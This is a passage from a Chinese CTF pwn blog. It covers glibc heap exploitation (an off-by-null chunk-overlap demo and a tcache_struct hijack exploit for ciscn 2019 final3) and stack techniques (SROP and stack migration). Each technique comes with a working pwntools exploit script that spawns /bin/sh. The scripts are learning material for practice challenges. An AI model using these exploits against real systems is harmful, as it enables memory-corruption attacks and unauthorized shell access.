largebin&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The fd_nextsize of prev points to a: %p\n&quot;</span>, ((<span class="hljs-type">void</span> **)prev)[<span class="hljs-number">2</span>]+<span class="hljs-number">0x10</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The bk_nextsize of prev points to b: %p\n&quot;</span>, ((<span class="hljs-type">void</span> **)prev)[<span class="hljs-number">3</span>]+<span class="hljs-number">0x10</span>);<br><br><span class="hljs-comment">// step4: allocate prev again to construct fake chunk</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nStep4: Allocate prev again to construct the fake chunk&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Since large chunk is sorted by size and a&#x27;s size is smaller than prev&#x27;s,&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;we can allocate 0x500 as before to take prev out&quot;</span>);<br><span class="hljs-type">void</span> *prev2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;prev2: malloc(0x500) = %p\n&quot;</span>, prev2);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now prev2 == prev, prev2-&gt;fd == prev2-&gt;fd_nextsize == a, and prev2-&gt;bk == prev2-&gt;bk_nextsize == b&quot;</span>);<br>assert(prev == prev2);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The fake chunk is contained in prev and the size is smaller than prev&#x27;s size by 0x10&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;So set its size to 0x501 (0x510-0x10 | flag)&quot;</span>);<br>((<span class="hljs-type">long</span> *)prev)[<span class="hljs-number">1</span>] = <span class="hljs-number">0x501</span>;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;And set its prev_size(next_chunk) to 0x500 to bypass the size==prev_size(next_chunk) check&quot;</span>);<br>*(<span class="hljs-type">long</span> *)(prev + <span class="hljs-number">0x500</span>) = <span class="hljs-number">0x500</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The fake chunk should be at: %p\n&quot;</span>, prev + <span class="hljs-number">0x10</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;use prev&#x27;s fd_nextsize &amp; bk_nextsize as fake_chunk&#x27;s fd &amp; bk&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now we have fake_chunk-&gt;fd == a and fake_chunk-&gt;bk == b&quot;</span>);<br><br><span class="hljs-comment">// step5: bypass unlinking</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nStep5: Manipulate residual pointers to bypass unlinking later.&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Take b out first by allocating 0x510&quot;</span>);<br><span class="hljs-type">void</span> *b2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x510</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Because of the residual pointers in b, b-&gt;fd points to a right now: %p\n&quot;</span>, ((<span class="hljs-type">void</span> **)b2)[<span class="hljs-number">0</span>]+<span class="hljs-number">0x10</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We can overwrite the least significant two bytes to make it our fake chunk.\n&quot;</span><br><span class="hljs-string">&quot;If the lowest 2nd byte is not \\x00, we need to guess what to write now\n&quot;</span>);<br>((<span class="hljs-type">char</span>*)b2)[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;\x10&#x27;</span>;<br>((<span class="hljs-type">char</span>*)b2)[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\x00&#x27;</span>;  <span class="hljs-comment">// b-&gt;fd &lt;- fake_chunk</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After the overwrite, b-&gt;fd is: %p, which is the chunk pointer to our fake chunk\n&quot;</span>, ((<span class="hljs-type">void</span> **)b2)[<span class="hljs-number">0</span>]);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;To do the same to a, we can move it to unsorted bin first&quot;</span><br><span class="hljs-string">&quot;by taking it out from largebin and free it into unsortedbin&quot;</span>);<br><span class="hljs-type">void</span> *a2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);<br><span class="hljs-built_in">free</span>(a2);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now free victim into unsortedbin so that a-&gt;bck points to victim&quot;</span>);<br><span class="hljs-built_in">free</span>(victim);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a-&gt;bck: %p, victim: %p\n&quot;</span>, ((<span class="hljs-type">void</span> **)a)[<span class="hljs-number">1</span>], victim);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Again, we take a out and overwrite a-&gt;bck to fake chunk&quot;</span>);<br><span class="hljs-type">void</span> *a3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);<br>((<span class="hljs-type">char</span>*)a3)[<span class="hljs-number">8</span>] = <span class="hljs-string">&#x27;\x10&#x27;</span>;<br>((<span class="hljs-type">char</span>*)a3)[<span class="hljs-number">9</span>] = <span class="hljs-string">&#x27;\x00&#x27;</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After the overwrite, a-&gt;bck is: %p, which is the chunk pointer to our fake chunk\n&quot;</span>, ((<span class="hljs-type">void</span> **)a3)[<span class="hljs-number">1</span>]);<br><span class="hljs-comment">// pass unlink_chunk in malloc.c:</span><br><span class="hljs-comment">//      mchunkptr fd = p-&gt;fd;</span><br><span class="hljs-comment">//      mchunkptr bk = p-&gt;bk;</span><br><span class="hljs-comment">//      if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))</span><br><span class="hljs-comment">//          malloc_printerr (&quot;corrupted double-linked list&quot;);</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;And we have:\n&quot;</span><br> <span class="hljs-string">&quot;fake_chunk-&gt;fd-&gt;bk == a-&gt;bk == fake_chunk\n&quot;</span><br> <span class="hljs-string">&quot;fake_chunk-&gt;bk-&gt;fd == b-&gt;fd == fake_chunk\n&quot;</span><br> );<br><br><span class="hljs-comment">// step6: add fake chunk into unsorted bin by off-by-null</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nStep6: Use backward consolidation to add fake chunk into unsortedbin&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Take victim out from unsortedbin&quot;</span>);<br><span class="hljs-type">void</span> *victim2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>, victim2);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;off-by-null into the size of vicim&quot;</span>);<br><span class="hljs-comment">/* VULNERABILITY */</span><br>((<span class="hljs-type">char</span> *)victim2)[<span class="hljs-number">-8</span>] = <span class="hljs-string">&#x27;\x00&#x27;</span>;<br><span class="hljs-comment">/* VULNERABILITY */</span><br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now if we free victim, libc will think the fake chunk is a free chunk above victim\n&quot;</span><br><span class="hljs-string">&quot;It will try to backward consolidate victim with our fake chunk by unlinking the fake chunk then\n&quot;</span><br><span class="hljs-string">&quot;add the merged chunk into unsortedbin.&quot;</span><br>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;For our fake chunk, because of what we did in step4,\n&quot;</span><br><span class="hljs-string">&quot;now P-&gt;fd-&gt;bk(%p) == P(%p), P-&gt;bk-&gt;fd(%p) == P(%p)\n&quot;</span><br><span class="hljs-string">&quot;so the unlink will succeed\n&quot;</span>, ((<span class="hljs-type">void</span> **)a3)[<span class="hljs-number">1</span>], prev, ((<span class="hljs-type">void</span> **)b2)[<span class="hljs-number">0</span>], prev);<br><span class="hljs-built_in">free</span>(victim);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;After freeing the victim, the new merged chunk is added to unsorted bin&quot;</span><br><span class="hljs-string">&quot;And it is overlapped with the prev chunk&quot;</span>);<br><br><span class="hljs-comment">// step7: validate the chunk overlapping</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now let&#x27;s validate the chunk overlapping&quot;</span>);<br><span class="hljs-type">void</span> *merged = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;merged: malloc(0x100) = %p\n&quot;</span>, merged);<br><span class="hljs-built_in">memset</span>(merged, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">0x80</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now merged&#x27;s content: %s\n&quot;</span>, (<span class="hljs-type">char</span> *)merged);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Overwrite prev&#x27;s content&quot;</span>);<br><span class="hljs-built_in">memset</span>(prev2, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-number">0x80</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;merged&#x27;s content has changed to: %s\n&quot;</span>, (<span class="hljs-type">char</span> *)merged);<br><br>assert(<span class="hljs-built_in">strstr</span>(merged, <span class="hljs-string">&quot;CCCCCCCCC&quot;</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>首先第一步, 通过各种手段使得我们真实的利用从后两字节为\x00的地址处开始, 之后先一堆东西, 不知道在做什么</p><p>此时我们把断点下到63行, 观察一下现在堆上的东西</p><p><img src="image-20231024003817588.png" alt="image-20231024003817588"></p><p>此时unsorted中的形式是这样的:</p><p><img src="image-20231024004308565.png" alt="image-20231024004308565"></p><blockquote><p>10.31 先 🕊 🌶</p></blockquote><h2 id="0x02-2️⃣-3️⃣5️⃣">0x02 2️⃣.3️⃣5️⃣</h2><p>没写完 先🕊</p><h2 id="0x03-Othersheap">0x03 Othersheap</h2><blockquote><p>0x03就是 平时刷什么题的时候遇到的有意思的做法 往这里一起写一写</p><p>这个博客是分很多天写的, 逻辑确实很混乱, 但是我觉得还好吧()</p></blockquote><h3 id="1-tcache-struct-hijack">1.tcache_struct hijack</h3><p>例题是ciscn 19年的final3, buu有, 这个题在这里不选择常规的方法, 因为他原本的环境里没有double free的检测</p><p><img src="image-20231031210329468.png" alt="image-20231031210329468"></p><p>每次分配后会给出地址, 这里是唯一输出, 所以首先思路应该是分配到在libc里的一个chunk.</p><p>然后还能看到一个裸的uaf, 如果不用stash可以伪造一个大chunk进unsorted再改</p><blockquote><p>但是我怎么感觉还不如这种方法, 又绕过了检查, <s>又不是那么难想</s></p></blockquote><p>所以在这里:</p><ul><li><p>我们首先是使用stash机制完成double free</p></li><li><p>但是stash需要很多次申请机会, 本身我们就只有24次, 实际上的stash过程就需要用到19次, 直到20th才轮到我们去进行任意地址写</p></li><li><p>故选择劫持 tcache struct, 就是放链表的那个大的结构体</p><ul><li>该结构体在libc2.27中是0x250大小, (后续版本可能有些差别), 前0x40段是count, 后面的是链表头地址</li><li>可以通过这里改count, 改掉这个之后可以达到<strong>不进入tcache</strong>的效果</li><li>由于链表头就在这个chunk里存着, 故可以通过控制这里达到直接控制chunk的效果, 似乎能做到些任意写</li></ul><blockquote><ul><li>这个结构体扔进unsorted之后, 再申请是不切割的(2.27的这个题是这样的), 暂时我还不知道是为什么,</li></ul></blockquote></li></ul><p>后续去搜了搜, 好像有点像个板子(), exp:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#context(log_level=&#x27;debug&#x27;)</span><br>r=process(<span class="hljs-string">&quot;./cf33&quot;</span>)<br><span class="hljs-comment">#r=remote(&quot;node4.buuoj.cn&quot;,27946)</span><br>elf=ELF(<span class="hljs-string">&quot;./cf33&quot;</span>)<br>libc=ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(r)<br>    pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size,content</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;index&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br>    r.recvuntil(<span class="hljs-string">&quot;size&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(size))<br>    r.sendafter(<span class="hljs-string">&quot;something&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">remove</span>(<span class="hljs-params">idx</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;index&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">b&quot;a&quot;</span>)<br>r.recvuntil(<span class="hljs-string">&quot;gift :0x&quot;</span>)<br>heap_base=<span class="hljs-built_in">int</span>(r.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x11e70</span><br>log.success(<span class="hljs-string">&quot;heap_base=&quot;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):<br>    add(i,<span class="hljs-number">0x70</span>,<span class="hljs-string">b&quot;a&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    remove(i)<br><span class="hljs-comment">#debug()</span><br>remove(<span class="hljs-number">7</span>)<br>remove(<span class="hljs-number">8</span>)<br>remove(<span class="hljs-number">7</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>,<span class="hljs-number">17</span>):<br>    add(i,<span class="hljs-number">0x70</span>,<span class="hljs-string">b&quot;/bin/sh&quot;</span>)<br><br>add(<span class="hljs-number">17</span>,<span class="hljs-number">0x70</span>,p64(heap_base+<span class="hljs-number">0x10</span>))<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">18</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">b&quot;a&quot;</span>)<br>add(<span class="hljs-number">19</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">b&quot;a&quot;</span>)<br><span class="hljs-comment">#debug()</span><br>payload=(<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">35</span>+<span class="hljs-string">b&#x27;\xff&#x27;</span>*<span class="hljs-number">1</span>).ljust(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(heap_base+<span class="hljs-number">0x10</span>)*<span class="hljs-number">6</span><br><span class="hljs-comment">#print(payload)</span><br>add(<span class="hljs-number">20</span>,<span class="hljs-number">0x70</span>,payload)<br><span class="hljs-comment">#debug()</span><br>remove(<span class="hljs-number">20</span>)<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">21</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&quot;a&quot;</span>)<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">22</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&quot;a&quot;</span>)<br>r.recvuntil(<span class="hljs-string">&quot;gift :0x&quot;</span>)<br>libc_base=<span class="hljs-built_in">int</span>(r.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x3ebca0</span><br>log.success(<span class="hljs-string">&quot;libc_base=&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">23</span>,<span class="hljs-number">0x50</span>,(<span class="hljs-string">b&#x27;\x07&#x27;</span>*<span class="hljs-number">10</span>).ljust(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]) * <span class="hljs-number">2</span>)<br>add(<span class="hljs-number">24</span>,<span class="hljs-number">0x10</span>,p64(libc_base+libc.sym[<span class="hljs-string">&quot;system&quot;</span>]))<br><span class="hljs-comment">#debug()</span><br>remove(<span class="hljs-number">10</span>)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p>主要思路是在19次达成stash之后, 从第20次起改掉0x250的count位和小chunk的链表头, 使结构体chunk进入unsorted, 再分配2次即可分配到libc里, 通过输出地址leak libc</p><p>然后再次劫持, 把链表头改成free_hook即可, 后续是常规过程.</p><h2 id="0x04-Others">0x04 Others</h2><p>在脱离用户态之前这里希望都可以一直更新, 能一直写下去就好.</p>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Advanced Stack Summary</title>
    <link href="/2023/10/22/Stack/"/>
    <url>/2023/10/22/Stack/</url>
    
    <content type="html"><![CDATA[<p>高档栈题的一点点总结</p><span id="more"></span><h2 id="0x00-O-o">0x00 O.o</h2><p><s>一般的0x00是废话环节</s>…</p><p>前段时间有一天突然有种水平上不去下不来的感觉, 水平说高不高说低不低, 很奇怪, 跟前辈聊了聊, wings给了个建议是做个总结, 一想, 也没什么坏处, 于是写几个高档的栈题的点, 大概是3个, 迁移, srop, ret2dlresolve.</p><blockquote><p>癌症晚期了, 👴8💊当白银</p></blockquote><p>后续应该还会加点别的, 毕竟栈题这一块还是有不少的小的东西, 例如一些好玩的fmt.</p><blockquote><p>23.10.23：目前下面的题应该全是newstar week3的, week3的题很不错, 一道多次迁移, 一道srop, 一道rtdlr, 缺的营养这一块给补上来了, 饱饱的, <s>也正好是我写这个东西的原因</s></p></blockquote><h2 id="0x01-Srop">0x01 Srop</h2><blockquote><p><s>个人觉得是一个比较奇怪的东西</s>😔</p></blockquote><h3 id="原理">原理</h3><p>主要利用signal机制, linux下一个程序中断的机制, 中断时, 内核为保存程序的上下文, 将所有寄存器信息入栈.</p><p><strong>中断结束后, 内核将执行sigreturn系统调用, 根据之前入栈的信息将寄存器恢复, 由于该空间可写, 故可以被伪造, 并且由于内核将sigreturn的地址放在栈顶, 故利用时只需要将伪造的frame串放置于系统调用地址后方</strong></p><blockquote><p>其实这个地方不是很确定, 但是实际上很多情况下都是这么利用的, 应该就是因为实际上的frame就在那个地址的后方去达到伪造的作用的.</p><p><img src="https://image.3001.net/images/20151128/14487175105930.png!small" alt="image.png"></p><p>看过最近的几个题之后我觉得似乎确实就是这样的, 至于之前的题有可能出现不是紧邻, 感觉两种情况, 1是题的情况不同要具体分析, 2是<s>我是个猪鼻没看明白</s></p></blockquote><p>由于功能非常强大, 故只要有syscall, 有/bin/sh串 的地址, 可以构造出一次调用, 即可随意getshell, .并且如果一次不能getshell的话, 可以随意控制sp ip寄存器, 不必担心例如迁移, 初始化等等导致的栈环境变化, 这便导致了这种方法的杀伤力非常之强.</p><p>上周newstar里面的srop相对来说比较简单, 小移一次bp多构造一次read输入到可控的bss段即可.</p><blockquote><p><s>然后上周这个猪鼻因为frame里面系统调用号写成0x59以至于卡了半个晚上跑了, 我自己觉得是有点难绷的</s></p></blockquote><p>如果要多次利用, 将ip的位置指向syscall ret即可, 应该syscall函数也是可以的(我不知道我没试过), 总之pop一步ip将sp(也就是下一个构造好的sropframe地址)pop进ip即可.</p><h3 id="exp">exp</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,)<br><span class="hljs-comment">#context(log_level=&#x27;debug&#x27;)</span><br>r=process(<span class="hljs-string">&quot;./srop&quot;</span>)<br><span class="hljs-comment">#r=remote(&quot;node4.buuoj.cn&quot;,26990)</span><br>elf=ELF(<span class="hljs-string">&quot;./srop&quot;</span>)<br><span class="hljs-comment">#libc=ELF(&quot;./libc-2.23.so&quot;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(r)<br>    pause()<br><br>syscall=<span class="hljs-number">0x401040</span><br>bss=<span class="hljs-number">0x404500</span><br>leave=<span class="hljs-number">0x401171</span><br>rdiret=<span class="hljs-number">0x401203</span><br><br>srop1=SigreturnFrame()<br>srop1.rdi=<span class="hljs-number">59</span><br>srop1.rsi=bss-<span class="hljs-number">0x30</span><br>srop1.rdx=<span class="hljs-number">0</span><br>srop1.rcx=<span class="hljs-number">0</span><br>srop1.rsp=bss<br>srop1.rip=syscall<br><br><span class="hljs-comment">#debug()</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+p64(bss)+p64(leave)<br>r.sendline(payload)<br><br><span class="hljs-comment">#debug()</span><br>payload=<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+p64(rdiret)+p64(<span class="hljs-number">15</span>)+p64(syscall)+<span class="hljs-built_in">bytes</span>(srop1)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>感觉机制比较奇怪, 但是可能实际用起来意外的好用, <s>不是很懂你们内核的机制</s></p><h2 id="0x02-Migration">0x02 Migration</h2><p>这个知识点其实困扰了我个人很久, 因为迁移前后栈环境似乎会有很多微小的变化, 并且对于这种方法我始终有一种别扭的感觉在里面, 一到多次迁移就可能会在sp或者哪里出一些莫名其妙的问题.</p><h3 id="原理-v2">原理</h3><p>原理感觉很简单, 主要利用函数调用结束的一些规矩, rop实际在leave ret时发挥作用, 但是如果在栈空间过小以至于只够溢出不够使用时, 普遍使用重复leave ret将sp和bp拉走, 迁移到我们想要的位置, 诸如bss段/已知栈地址.</p><p>这是比较好懂的, 但是实际应用过程并不是很简单的在后面加一步leave ret, 很多时候输入次数不够, 常常选择先将bp拉走, 根据缓冲区以bp寻址的特点迁移布栈, 最后布栈完成一步leave ret将ip拉来开始执行.</p><p>例题有说是newstar week3的题.</p><h3 id="exp-v2">exp</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#context(log_level=&#x27;debug&#x27;)</span><br>r=process(<span class="hljs-string">&quot;./mig&quot;</span>)<br><span class="hljs-comment">#r=remote(&quot;node4.buuoj.cn&quot;,26990)</span><br>elf=ELF(<span class="hljs-string">&quot;./mig&quot;</span>)<br><span class="hljs-comment">#libc=ELF(&quot;./libc-2.23.so&quot;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(r)<br>    pause()<br><br>putsplt=elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>putsgot=elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>bss=elf.bss()+<span class="hljs-number">0xa00</span><br>rdiret=<span class="hljs-number">0x4012b3</span><br>rbpret=<span class="hljs-number">0x40115d</span><br>leaveret=<span class="hljs-number">0x401227</span><br>ret=<span class="hljs-number">0x40101a</span><br>read=<span class="hljs-number">0x4011f3</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(bss))<br>r.recvuntil(<span class="hljs-string">&quot;me:&quot;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x50</span>+p64(bss)+p64(read)<br>r.send(payload)<br><br><span class="hljs-comment">#debug()</span><br>r.recvuntil(<span class="hljs-string">&quot;me:&quot;</span>)<br>payload=p64(rdiret)+p64(putsgot)+p64(putsplt)+p64(rbpret)+p64(bss+<span class="hljs-number">0x100</span>)+p64(read)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br>payload+=p64(bss-<span class="hljs-number">0x58</span>)+p64(leaveret)<br>r.send(payload)<br><br>putsaddr=u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc=LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>,putsaddr)<br>libcbase=putsaddr-libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br>sysaddr=libcbase+libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binshaddr=libcbase+libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><br>gdb.attach(r)<br>pause()<br>r.recvuntil(<span class="hljs-string">&quot;me:&quot;</span>)<br>payload=p64(rdiret)+p64(binshaddr)+p64(sysaddr)<br>payload+=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>+p64(bss+<span class="hljs-number">0xa8</span>)+p64(leaveret)<br><br>r.send(payload)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p>有个点需要注意, 在后续过程中很有可能sp会因为调用函数的时候开栈帧被拉回来, 由于0x1000页对齐, bss段其实是很大一部分, 如果偏移写少了拉回来就挂掉了, 所以迁bss的时候普遍要往更高地址迁, 诸如这个0xa00.</p><blockquote><p>这个题第一次迁移的时候要拉bp似乎也算是个特别的点.</p></blockquote><h2 id="0x03-ret2dlresolve">0x03 ret2dlresolve</h2><p>没怎么看懂, 